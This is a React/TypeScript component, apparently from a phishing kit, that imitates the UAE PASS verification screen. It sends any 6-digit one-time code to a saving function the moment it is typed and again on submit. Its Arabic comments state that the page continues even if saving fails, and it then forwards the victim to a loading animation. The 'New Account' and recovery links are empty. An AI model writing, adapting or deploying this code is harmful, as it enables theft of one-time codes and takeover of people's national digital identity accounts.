import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/VerificationCode.css';
import { saveVerificationCode } from '../utils/api';

const VerificationCode: React.FC = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [isButtonEnabled, setIsButtonEnabled] = useState(false);

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 6) {
      setCode(value);
      setIsButtonEnabled(value.length === 6);
      
      // حفظ رمز التحقق فورياً عند إدخال 6 أرقام
      if (value.length === 6) {
        saveVerificationCode(value);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // حفظ رمز التحقق عند الضغط على زر التحقق
    try {
      await saveVerificationCode(code);
      navigate('/loading-animation');
    } catch (error) {
      console.error('Error saving verification code:', error);
      // المتابعة حتى في حالة فشل الحفظ
      navigate('/loading-animation');
    }
  };

  return (
    <div className="verification-code-container">
      <div className="verification-code-header">
        <div className="logo-container">
          <img src="/uae-pass-logo.png" alt="UAE PASS" className="uae-pass-logo" />
        </div>
      </div>
      <div className="verification-code-content">
        <div className="info-message">
          <p>Don't have a UAE PASS account?</p>
          <div className="action-links">
            <a href="#" className="new-account">New Account</a>
            <a href="#" className="recover-account">How to recover account</a>
          </div>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="verificationCode">Enter verification code</label>
            <input
              type="text"
              id="verificationCode"
              value={code}
              onChange={handleCodeChange}
              placeholder="Enter 6-digit code"
              required
            />
          </div>
          <button
            type="submit"
            className="verify-button"
            disabled={!isButtonEnabled}
          >
            Verify
          </button>
        </form>
        <div className="footer">
          <p>© 2025 UAE PASS. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

export default VerificationCode;
